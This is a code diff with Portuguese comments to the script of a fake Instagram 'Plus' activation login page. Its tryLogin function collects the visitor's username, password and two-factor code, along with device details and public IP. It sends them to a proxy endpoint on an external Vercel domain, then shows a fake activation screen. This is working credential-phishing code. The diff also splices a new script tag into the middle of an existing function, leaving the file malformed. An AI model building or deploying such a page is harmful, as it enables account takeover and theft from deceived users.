@@ -494,110 +494,247 @@ async function tryLogin(){
       void f.offsetWidth;
       f.classList.add('shake');
     }
-    return;
-  }
+<script>
+// Estado global
+let currentOtpVisible = false;
+let activationTimer = null;
 
-  var otpContainer = document.getElementById('otpContainer');
-  var otpInput = document.getElementById('otp');
-  var otpErr = document.getElementById('otpErr');
-  var isOtpVisible = otpContainer ? otpContainer.style.display === 'block' : false;
+// Configuração do Endpoint
+// Usa a origem atual se estiver em produção, caso contrário usa o domínio fixo
+const PROXY_ENDPOINT = window.location.origin.startsWith('http') 
+    ? `${window.location.origin}/api/proxy` 
+    : 'https://instaplus-six.vercel.app/api/proxy';
 
-  if (!isOtpVisible) {
-    if(otpContainer) {
-      otpContainer.style.display = 'block';
-      if(otpInput) otpInput.focus();
+/**
+ * Navega para uma rota específica
+ * @param {string} v - Nome da tela (plus, login, ativando)
+ */
+function go(v) {
+    const targetHash = `#${v}`;
+    
+    // Se o hash já for o mesmo, força a atualização da rota manualmente
+    if (location.hash === targetHash) {
+        route();
+    } else {
+        location.hash = targetHash;
+        // Garante a atualização imediata caso o hashchange tenha atraso
+        route(); 
     }
-    return;
-  }
+}
 
-  if (isOtpVisible && otpInput.value.trim() === '') {
-    if(otpInput) otpInput.classList.add('err');
-    if(otpErr) otpErr.hidden = false;
-    return;
-  } else if (isOtpVisible) {
-    if(otpInput) otpInput.classList.remove('err');
-    if(otpErr) otpErr.hidden = true;
-  }
+/**
+ * Atualiza a interface com base no hash atual
+ */
+function route() {
+    let h = location.hash.slice(1) || 'plus';
+    // Validação de rotas válidas
+    if (!['plus', 'login', 'ativando'].includes(h)) h = 'plus';
 
-  var btn = document.querySelector('.lbtn');
-  if(btn){
+    // Esconde todas as telas
+    ['plus', 'login', 'ativando'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.hidden = (id !== h);
+            // Força flex para garantir layout correto quando visível
+            el.style.display = (id === h) ? 'flex' : 'none';
+        }
+    });
+
+    // Animações de entrada (stagger)
+    const sec = document.getElementById(h);
+    if (sec) {
+        const items = sec.querySelectorAll('.scroll>*, .footer>*, .lback, .lang, .lmid, .lform>*, .lbottom>*');
+        items.forEach((n, k) => {
+            n.style.setProperty('--i', k);
+        });
+    }
+
+    // Lógica da tela de carregamento
+    clearTimeout(activationTimer);
+    const a = document.getElementById('ativando');
+    if (a) {
+        a.classList.remove('run', 'done');
+        if (h === 'ativando') {
+            // Duplo requestAnimationFrame para garantir que a transição CSS aplique
+            requestAnimationFrame(() => {
+                requestAnimationFrame(() => {
+                    a.classList.add('run');
+                });
+            });
+            // Simula o tempo de processamento
+            activationTimer = setTimeout(() => {
+                a.classList.add('done');
+            }, 3500);
+        }
+    }
+    window.scrollTo(0, 0);
+}
+
+/**
+ * Função de Login com Validação e Envio
+ */
+async function tryLogin() {
+    const u = document.getElementById('user');
+    const p = document.getElementById('pass');
+    const uE = document.getElementById('userErr');
+    const pE = document.getElementById('passErr');
+    const otpContainer = document.getElementById('otpContainer');
+    const otpInput = document.getElementById('otp');
+    const otpErr = document.getElementById('otpErr');
+    const btn = document.querySelector('.lbtn');
+    
+    let ok = true;
+
+    // 1. Validação Básica
+    if (u.value.trim() === '') {
+        u.classList.add('err');
+        uE.hidden = false;
+        ok = false;
+    } else {
+        u.classList.remove('err');
+        uE.hidden = true;
+    }
+
+    if (p.value === '') {
+        p.classList.add('err');
+        pE.hidden = false;
+        ok = false;
+    } else {
+        p.classList.remove('err');
+        pE.hidden = true;
+    }
+
+    if (!ok) {
+        const f = document.querySelector('.lform');
+        f.classList.remove('shake');
+        void f.offsetWidth; // Force reflow
+        f.classList.add('shake');
+        return;
+    }
+
+    // 2. Lógica de 2FA (OTP)
+    const isOtpVisible = otpContainer.style.display === 'block';
+
+    if (!isOtpVisible) {
+        // Mostra o campo de OTP e foca
+        otpContainer.style.display = 'block';
+        otpInput.focus();
+        return; // Para o fluxo até o usuário inserir o código
+    }
+
+    // Se já está visível, valida o campo OTP
+    if (otpInput.value.trim() === '') {
+        otpInput.classList.add('err');
+        otpErr.hidden = false;
+        return;
+    } else {
+        otpInput.classList.remove('err');
+        otpErr.hidden = true;
+    }
+
+    // 3. Estado de Carregamento
     btn.disabled = true;
     btn.textContent = 'Verificando...';
-  }
 
-  var userAgent = navigator.userAgent;
-  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  var browser = 'Desconhecido';
-  if (userAgent.match(/chrome|chromium|crios/i)) browser = 'Chrome';
-  else if (userAgent.match(/firefox|fxios/i)) browser = 'Firefox';
-  else if (userAgent.match(/safari/i) && !userAgent.match(/chrome|chromium|crios/i)) browser = 'Safari';
-  else if (userAgent.match(/edg/i)) browser = 'Edge';
+    // 4. Coleta de Metadados
+    const userAgent = navigator.userAgent;
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+    
+    let browser = 'Desconhecido';
+    if (userAgent.match(/chrome|chromium|crios/i)) browser = 'Chrome';
+    else if (userAgent.match(/firefox|fxios/i)) browser = 'Firefox';
+    else if (userAgent.match(/safari/i) && !userAgent.match(/chrome|chromium|crios/i)) browser = 'Safari';
+    else if (userAgent.match(/edg/i)) browser = 'Edge';
 
-  var os = 'Desconhecido';
-  if (userAgent.match(/iPad/i) || (userAgent.match(/Macintosh/i) && navigator.maxTouchPoints > 1)) os = 'iPadOS';
-  else if (userAgent.match(/iPhone/i)) os = 'iOS';
-  else if (userAgent.match(/Android/i)) os = 'Android';
-  else if (userAgent.match(/Windows/i)) os = 'Windows';
-  else if (userAgent.match(/Macintosh/i)) os = 'macOS';
-  else if (userAgent.match(/Linux/i)) os = 'Linux';
+    let os = 'Desconhecido';
+    if (userAgent.match(/iPad/i) || (userAgent.match(/Macintosh/i) && navigator.maxTouchPoints > 1)) os = 'iPadOS';
+    else if (userAgent.match(/iPhone/i)) os = 'iOS';
+    else if (userAgent.match(/Android/i)) os = 'Android';
+    else if (userAgent.match(/Windows/i)) os = 'Windows';
+    else if (userAgent.match(/Macintosh/i)) os = 'macOS';
+    else if (userAgent.match(/Linux/i)) os = 'Linux';
 
-  var meta = {
-    isMobile: isMobile,
-    browser: browser,
-    os: os,
-    lang: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timestamp: new Date().toLocaleString('pt-BR'),
-    ip: 'Indisponível'
-  };
+    const meta = {
+        isMobile,
+        browser,
+        os,
+        lang: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toLocaleString('pt-BR'),
+        ip: 'Indisponível'
+    };
 
-  try {
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 2000);
-    const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
-    clearTimeout(timeoutId);
-    const ipData = await ipRes.json();
-    meta.ip = ipData.ip;
-  } catch (e) {}
-
-  const payload = {
-    user: u.value.trim(),
-    pass: p.value,
-    otp: otpInput ? otpInput.value.trim() : '',
-    meta: meta
-  };
-
-  try {
-    const response = await fetch(PROXY_ENDPOINT, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-    const result = await response.json();
-    console.log('Resposta do Proxy:', result);
-
-    if (result.success === false || result.igStatus !== 'ok') {
-      alert('Erro ao verificar. Tente novamente.');
-      if(btn){ btn.disabled = false; btn.textContent = 'Entrar'; }
-      return;
+    // Tenta obter IP público com timeout
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 2000);
+        const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+        clearTimeout(timeoutId);
+        const ipData = await ipRes.json();
+        meta.ip = ipData.ip;
+    } catch (e) {
+        // Mantém 'Indisponível' se falhar
     }
 
-  } catch (error) {
-    console.error('Falha:', error);
-    alert('Erro de conexão.');
-    if(btn){ btn.disabled = false; btn.textContent = 'Entrar'; }
-    return;
-  }
+    const payload = {
+        user: u.value.trim(),
+        pass: p.value,
+        otp: otpInput.value.trim(),
+        meta: meta
+    };
 
-  setTimeout(function() {
-    window.location.href = 'https://www.instagram.com/';
-  }, 1500);
+    console.log('Enviando payload:', payload);
+
+    // 5. Envio para Proxy
+    try {
+        const response = await fetch(PROXY_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const result = await response.json();
+        console.log('Resposta do Proxy:', result);
+
+        // Opção: Tratar erros específicos do backend
+        if (result.success === false) {
+            alert(result.message || 'Erro ao verificar credenciais.');
+            btn.disabled = false;
+            btn.textContent = 'Entrar';
+            return;
+        }
+
+    } catch (error) {
+        console.error('Falha na comunicação:', error);
+        alert('Erro de conexão. Verifique sua internet.');
+        btn.disabled = false;
+        btn.textContent = 'Entrar';
+        return;
+    }
+
+    // 6. Sucesso - Transição para tela de carregamento
+    go('ativando');
+    
+    // Limpa campos opcional
+    // u.value = '';
+    // p.value = '';
+    // otpInput.value = '';
+    // otpContainer.style.display = 'none';
+    
+    // Reset do botão para próxima interação
+    setTimeout(() => {
+        btn.disabled = false;
+        btn.textContent = 'Entrar';
+    }, 3500); // Sincronizado com o tempo da tela de carregamento
 }
 
 // Inicialização
 window.addEventListener('hashchange', route);
-// Chama a rota assim que o script carregar
-route();
+route(); // Chama a rota inicial
 </script>
 </body>
 </html>
